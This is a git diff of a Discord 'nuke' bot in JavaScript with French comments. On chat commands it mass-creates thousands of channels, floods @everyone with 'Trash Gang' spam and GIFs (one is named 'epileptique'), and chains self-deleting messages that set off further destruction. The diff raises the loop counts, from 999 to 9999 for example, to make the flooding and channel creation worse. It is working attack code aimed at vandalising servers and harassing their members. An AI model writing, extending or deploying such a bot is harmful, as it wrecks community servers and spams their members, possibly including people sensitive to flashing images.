@@ -538,19 +538,17 @@ if(message.content === "roles"){
       message.guild.setIcon("https://cdn.discordapp.com/attachments/521480062831165442/521732094859149312/COVERART-2-350x350.jpg")
     }
     if(message.content === "pd"){
-      for(var i =0; i < 450; i++){
+      for(var i =0; i < 999; i++){
       message.guild.createChannel("BY","voice")
       }
     }
     //réaction en chaine
     if(message.content.includes("@everyone")){
-        for(var i = 0; i < 999; i++){
+        for(var i = 0; i < 9999; i++){
         message.channel.send("@everyone Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxnghttps://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif")}
         }
     if(message.content === "channel"){
-        message.channel.send("roles").then(m => m.delete());
-        message.channel.send("issou").then(m => m.delete());
-          for(var i = 0; i < 999; i++){
+          for(var i = 0; i < 9999; i++){
               message.guild.createChannel("FUCKED", "text").then(c => c.send("@everyone Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxnghttps://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif"))
               message.guild.createChannel("BY","voice")
               message.guild.createChannel("TRASH GANG","category")    
@@ -569,7 +567,8 @@ if(message.content === "roles"){
               }
               //on commence la destruction
               if(message.content.includes("détruire")){
-                  message.channel.send("ban").then(m => m.delete());
+                  message.channel.send("issou").then(m => m.delete());
+                  message.channel.send("roles").then(m => m.delete());
                   message.channel.send("drole").then(m => m.delete());
                   message.channel.send("destroy").then(m => m.delete());
                   message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
